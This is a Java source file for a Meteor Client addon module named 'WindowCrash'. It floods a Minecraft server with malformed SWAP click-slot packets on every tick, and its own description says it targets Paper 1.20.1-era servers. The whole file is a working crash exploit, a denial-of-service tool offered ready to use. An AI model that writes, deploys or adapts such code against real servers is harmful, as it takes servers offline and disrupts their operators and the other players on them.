package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

public class WindowCrash extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("Crash");

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Packets sent each tick.")
        .defaultValue(6).min(1).sliderMax(12).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public WindowCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "window-crash",
            "Sends SWAP click-slot packets with an out-of-range slot. Targets Paper 1.20.1-era window handling.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.player.currentScreenHandler == null) return;
        ScreenHandler handler = mc.player.currentScreenHandler;
        for (int i = 0; i < packets.get() + 1; i++) {
            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                handler.syncId, handler.getRevision(),
                (short) 36, (byte) -1, SlotActionType.SWAP,
                new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
